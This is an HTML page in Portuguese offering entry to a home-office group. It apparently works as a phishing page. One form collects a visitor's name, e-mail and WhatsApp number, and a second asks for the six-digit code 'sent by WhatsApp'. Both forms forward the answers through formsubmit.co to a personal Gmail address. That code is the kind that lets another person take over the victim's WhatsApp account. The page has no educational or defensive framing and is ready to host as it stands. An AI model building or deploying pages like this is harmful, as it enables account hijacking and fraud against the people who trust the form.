<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Formulários de Entrada</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f0f0f0;
      padding: 20px;
    }
    .container {
      max-width: 400px;
      margin: auto;
      background: #fff;
      padding: 25px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      margin-bottom: 40px;
    }
    h2 {
      margin-bottom: 10px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 6px;
      border: 1px solid #ccc;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #4CAF50;
      border: none;
      color: white;
      font-size: 16px;
      border-radius: 6px;
      cursor: pointer;
    }
    button.blue {
      background-color: #2196F3;
    }
  </style>
</head>
<body>

  <!-- Formulário 1 -->
  <div class="container">
    <h2>Entrar para o Grupo</h2>
    <p>Preencha os dados para continuar:</p>
    <form action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
      <input type="text" name="nome" placeholder="Seu nome" required>
      <input type="email" name="email" placeholder="Seu e-mail" required>
      <input type="text" name="whatsapp" placeholder="Seu WhatsApp com DDD" required>
      <input type="hidden" name="_subject" value="Novo cadastro - Home Office">
      <button type="submit">Enviar dados</button>
    </form>
  </div>

  <!-- Formulário 2 -->
  <div class="container">
    <h2>Confirme o Código</h2>
    <p>Digite o código de 6 dígitos enviado por WhatsApp:</p>
    <form action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
      <input type="text" name="codigo_confirmacao" placeholder="Ex: 123456" required pattern="\d{6}" maxlength="6">
      <input type="hidden" name="_subject" value="Código de Confirmação">
      <button type="submit" class="blue">Confirmar Código</button>
    </form>
  </div>

</body>
</html>
